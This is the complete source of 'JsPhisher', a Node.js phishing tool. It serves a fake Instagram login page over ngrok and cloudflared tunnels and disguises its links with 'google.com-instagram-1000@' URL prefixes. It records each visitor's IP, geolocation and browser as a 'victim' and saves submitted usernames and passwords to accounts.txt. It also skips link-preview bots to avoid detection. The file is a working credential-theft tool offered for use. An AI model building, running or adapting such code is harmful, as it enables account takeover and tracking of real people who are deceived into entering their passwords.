/**
 * JsPhisher - Easy phishing tool
 * Coded by: @gamerboytr
 * License: GPL-3.0
 * Its a open-source project
 * Please report any bugs to: https://github.com/gamerboytr/JsPhisher/issues
 */

"use strict";
try {
	require("body-parser");
} catch (e) {
	console.clear();
	if (e.code !== "MODULE_NOT_FOUND") {
		throw e;
	}
	console.log("You don't have node_modules installed.");
	console.log("Installing dependencies...");
	require("child_process").execSync("npm install");
	console.log("Installed all dependencies.");
}
const express = require("express");
const bodyParser = require("body-parser");
const readlineSync = require("readline-sync");
const geoip = require("geoip-lite");
const chalk = require("chalk");
const agentParser = require("ua-parser-js");
const child_process = require("child_process");
const downloader = require("download");
const AdmZip = require("adm-zip");
const axios = require("axios").default;
const app = express();
const port = process.env.PORT || process.env.NODE_PORT || 6969;
const short = require("./short");
const path = require("path");
const fs = require("fs");

const VERSION = "1.2.1";
const isTermux = process.platform === "android";
const isLinux = process.platform === "linux" || isTermux;
const logAsk = chalk.greenBright`[{whiteBright ?}]`;
const logSuccess = chalk.yellowBright`[{whiteBright √}]`;
const logError = chalk.redBright`[{whiteBright !}]`;
const logInfo = chalk.yellowBright`[{whiteBright +}]`;
const logInfo2 = chalk.greenBright`[{whiteBright •}]`;
const botDetecter = /(Discordbot|bitlybot|facebookexternalhit)/gi;

const logLogo =
	chalk.red`       _     _____  _     _     _               \n` +
	chalk.cyan`      | |   |  __ \\| |   (_)   | |              \n` +
	chalk.yellow`      | |___| |__) | |__  _ ___| |__   ___ _ __ \n` +
	chalk.blue`  _   | / __|  ___/| '_ \\| / __| '_ \\ / _ \\ '__|\n` +
	chalk.red` | |__| \\__ \\ |    | | | | \\__ \\ | | |  __/ |   \n` +
	chalk.yellow`  \\____/|___/_|    |_| |_|_|___/_| |_|\\___|_|\n` +
	chalk.cyan`				       [v${VERSION}]	  \n` +
	chalk.red`			      [By GamerboyTR]	  \n`;

console.clear();
console.log(logLogo);
const loggedIps = [];
if (process.platform === "darwin") {
	console.log(chalk.redBright`${logError} You are running on a Mac. This is not supported.`);
	process.exit(1);
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "bin", "instagram")));
app.disable("x-powered-by");

(async () => {
	await controlVersion().catch(throwError);
	await installRequirements().catch(throwError);
	if (isTermux) {
		console.log(chalk.magenta`${logInfo} If you haven't enabled hotspot, please enable it!\n`);
		await new Promise(r => setTimeout(r, 1000));
	}
	console.log(chalk.magenta`${logInfo2} Initializing local server at localhost:${port}...\n`);
	await new Promise(r =>
		app.listen(port, _ => {
			console.log(chalk.cyan`${logInfo} Local server has started successfully!\n`);
			r();
		})
	);
	console.log(chalk.magenta`${logInfo2} Initializing tunnelers at same address...\n`);
	const ngrok = await openNgrok(port).catch(throwError);
	const shortNgrok = await short(ngrok).catch(throwError);
	const cloudflared = !isTermux ? await openCloudflared(port).catch(throwError) : null;
	const shortCf = !isTermux ? await short(cloudflared).catch(throwError) : null;
	if (!isTermux) {
		console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
		console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cloudflared}}\n`);
		console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${shortCf.split("/")[0] + "//google.com-instagram-1000@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
	}
	console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "3"} > {yellowBright ${ngrok}}\n`);
	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "4"} > {yellowBright ${shortNgrok.split("/")[0] + "//google.com-instagram-1000@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
	console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
	if (process.platform === "win32") {
		require("readline")
			.createInterface({ input: process.stdin, output: process.stdout })
			.on("SIGINT", () => process.emit("SIGINT"));
	}
	process.on("SIGINT", onExit);
})();

app.all("/", async (req, res) => {
	const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
	const userAgent = req.headers["user-agent"];
	const ua = agentParser(userAgent);
	const referer = req.headers?.referer;
	const location = geoip.lookup(ip);
	const { data: request } = await axios.get(`https://ipwhois.app/json/${ip}`).catch(throwError);
	res.redirect("login");
	if (ip !== "::1" && !botDetecter.test(userAgent) && !loggedIps.includes(ip) && request.type && location?.city) {
		console.clear();
		console.log(logLogo);
		console.log(chalk.greenBright`${logSuccess} Victim IP found!\n`);

		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} IP                   :  ${ip}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} IP Type              :  ${request.type}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} User OS              :  ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Browser              :  ${ua.browser.name ?? "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Version              :  ${ua.browser.version ?? "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Location             :  ${request?.city ?? "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} GeoLocation(lat, lon):  ${location.ll.join(", ")}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Curreny              :  ${request.currency_code}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Referer              :  ${referer ?? "No referer"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} UserAgent            :  ${userAgent ?? "No agent"}\n`);

		loggedIps.push(ip);
		fs.appendFileSync("./ip.txt", `${ip} - ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"} - ${ua.browser.name ?? "Unknown"}${" " + ua.browser.version ?? ""} - ${location?.city ?? "Unknown"} - ${location.ll.join(", ")} - ${referer ?? "No referer"}\n`);
		console.log(chalk.cyan`${logInfo} Saved in ip.txt\n`);
		console.log(chalk.cyan`${logInfo} Waiting for next... {cyanBright Press {red Ctrl+C} to exit}`);
	}
});

app.get("/login", (_req, res) => {
	res.sendFile(path.join(__dirname, "bin", "instagram", "login.html"));
});

app.post("/login", (req, res) => {
	const { username, password } = req.body;
	if (!username?.trim?.() || !password?.trim?.()) {
		res.redirect("/login");
		return;
	}
	res.redirect("https://instagram.com");
	console.log(chalk.greenBright`${logSuccess} Victim login info found!\n`);

	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Instagram Username:  ${username}`);
	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Instagram Password:  ${password}\n`);

	fs.appendFileSync("./accounts.txt", `${username}:${password}\n`);
	console.log(chalk.cyan`${logInfo} Saved in accounts.txt\n`);
	console.log(chalk.cyan`${logInfo} Waiting for next... {cyanBright Press {red Ctrl+C} to exit}`);
});

//! Functions

function controlVersion() {
	return new Promise(async (resolve, reject) => {
		const { data: readme } = await axios.get("https://raw.githubusercontent.com/gamerboytr/JsPhisher/master/README.md").catch(reject);
		const version = readme.match(/Version-(.*?)-green/)[1];
		const changelogRequest = await axios.get(`https://raw.githubusercontent.com/gamerboytr/JsPhisher/master/CHANGELOG.md`).catch(() => {});
		const changelog = changelogRequest?.data;
		if (version !== VERSION) {
			console.clear();
			console.log(logLogo);
			console.log(chalk.redBright`${logError} New version available!\n`);
			console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Current version:  ${VERSION}`);
			console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} New version:      ${version}\n`);
			console.log(chalk.yellow`${logAsk} Do you want to update? {yellowBright (y/n)}`);
			if (readlineSync.keyInYN("")) {
				console.clear();
				console.log(logLogo);
				console.log(chalk.greenBright`${logSuccess} Updating...\n`);
				console.log(chalk.yellow`${logInfo} Downloading repo...`);
				const currentDir = process.cwd().replaceAll("\\", "/").split("/")[process.cwd().replaceAll("\\", "/").split("/").length - 2];
				child_process.execSync(`cd ../.. && ${isLinux ? `rm -rf ${currentDir}` : `rmdir /S /Q ${currentDir}`} && git clone https://github.com/gamerboytr/JsPhisher`);
				console.log(chalk.yellow`${logInfo} Updated!\n`);
				console.log(chalk.yellow`${logInfo} Please restart terminal manually.\n`);
				if (changelog) {
					console.log(chalk.yellow`${logInfo} Changelog:\n`);
					console.log(chalk.yellow(changelog));
				}
				process.exit();
			} else {
				console.clear();
				console.log(logLogo);
				console.log(chalk.greenBright`${logSuccess} Using old version.\n`);
			}
		}
		resolve();
	});
}

function getArch() {
	let arch = process.arch;
	if (isLinux) {
		if (arch === "x64") {
			arch = "amd64";
		} else if (arch === "x32") {
			arch = "amd";
		}
	} else {
		if (arch === "x32") {
			arch = "386";
		}
	}
	return arch;
}

function installRequirements() {
	return new Promise(async (resolve, reject) => {
		console.clear();
		console.log(logLogo);
		if (!fs.existsSync(path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`))) {
			console.log(chalk.yellow`${logInfo2} Downloading cloudflared...`);
			const cloudflaredLink = `https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${isLinux ? `linux-${getArch()}.deb` : "windows-386.exe"}`;
			try {
				await downloader(cloudflaredLink, path.join(__dirname, "bin"), { filename: `cloudflared${!isLinux ? ".exe" : ""}` }).catch(reject);
				console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
				if (isLinux) {
					child_process.execSync(`chmod +x ${path.join(__dirname, "bin", "cloudflared")}`);
				}
			} catch {
				console.log(chalk.redBright`${logError} Failed to download cloudflared!\n`);
				console.log(chalk.yellow`${logInfo} Please download it manually\n`);
			}
		}
		if (!fs.existsSync(path.join(__dirname, "bin", `ngrok${!isLinux ? ".exe" : ""}`))) {
			console.log(chalk.yellow`${logInfo2} Downloading ngrok...`);
			const ngrokLink = `https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-${isLinux ? `linux-${getArch()}.tgz` : "windows-386.zip"}`;
			try {
				await downloader(ngrokLink, path.join(__dirname, "bin"), { filename: `ngrok${isLinux ? ".tgz" : ".zip"}` }).catch(reject);
				console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
				console.log(chalk.yellow`${logInfo2} Extracting...`);
				if (isLinux) {
					child_process.execSync(`tar -xvf ${path.join(__dirname, "bin", "ngrok.tgz")} -C ${path.join(__dirname, "bin")}`);
					fs.unlinkSync(path.join(__dirname, "bin", "ngrok.tgz"));
				} else {
					new AdmZip(path.join(__dirname, "bin", "ngrok.zip")).extractAllTo(path.join(__dirname, "bin"));
					fs.unlinkSync(path.join(__dirname, "bin", "ngrok.zip"));
				}
				console.log(chalk.yellow`${logSuccess} Extracted!\n`);
			} catch {
				console.log(chalk.redBright`${logError} Failed to download ngrok!\n`);
				console.log(chalk.yellow`${logInfo} Please download it manually\n`);
			}
		}
		if (fs.existsSync(path.join(__dirname, "bin", "instagram.zip"))) {
			console.log(chalk.yellow`${logInfo2} Extracting instagram...`);
			try {
				new AdmZip(path.join(__dirname, "bin", "instagram.zip")).extractAllTo(path.join(__dirname, "bin", "instagram"), true);
				console.log(chalk.yellow`${logSuccess} Extracted!\n`);
				console.log(chalk.yellow`${logInfo2} Removing zip file...`);
				fs.unlinkSync(path.join(__dirname, "bin", "instagram.zip"));
				console.log(chalk.yellow`${logSuccess} Removed!\n`);
			} catch {
				console.log(chalk.redBright`${logError} Failed to extract instagram!\n`);
				console.log(chalk.yellow`${logInfo} Please extract it manually\n`);
			}
		}
		resolve();
	});
}

function openNgrok(port) {
	return new Promise(async (resolve, reject) => {
		if (!fs.existsSync(path.join(__dirname, "bin", `ngrok${!isLinux ? ".exe" : ""}`))) {
			return reject("Cannot found ngrok!");
		}
		child_process.spawn("bin/ngrok", ["http", port]);
		await new Promise(r => setTimeout(r, 3000));
		let ngrokUrl;
		while (!ngrokUrl) {
			try {
				let request = await axios.get("http://127.0.0.1:4040/api/tunnels").catch(() => {});
				if (request?.data?.tunnels?.[0]?.public_url) {
					ngrokUrl = (request.data.tunnels?.[1] ?? request.data.tunnels?.[0]).public_url;
				} else {
					await new Promise(r => setTimeout(r, 1000));
				}
			} catch (e) {
				return reject("Failed to start ngrok, please try again : " + e);
			}
		}
		resolve(ngrokUrl);
	});
}

function openCloudflared(port) {
	return new Promise((resolve, reject) => {
		if (!fs.existsSync(path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`))) {
			return reject("Cannot found cloudlfared!");
		}
		if (isTermux) {
			return reject("Cloudflared is not supported on Termux");
		}
		let cfUrl;
		let cfShowed = false;
		let cfReady = false;
		child_process.spawn("bin/cloudflared", ["tunnel", "--url", `http://localhost:${port}`]).stderr.on("data", data => {
			if (data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/)) {
				cfUrl = data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/);
			}
			cfReady = !!data.toString().match(/Connection (.*) registered/);
			if (cfReady && !cfShowed) {
				cfShowed = true;
				resolve(cfUrl[0]);
			}
		});
	});
}

function onExit(withoutLog = false) {
	if (!withoutLog) {
		console.log(chalk.yellowBright`\n${logInfo2} Thanks for using JsPhisher!\n`);
	}
	axios.delete("http://127.0.0.1:4040/api/tunnels/command_line").catch(() => {});
	axios.delete("http://127.0.0.1:4040/api/tunnels/command_line%20%28http%29").catch(() => {}); //! For HTTPS
	process.exit();
}

function throwError(error) {
	console.log(chalk.redBright`${logError} ${error}\n`);
	onExit(true);
}
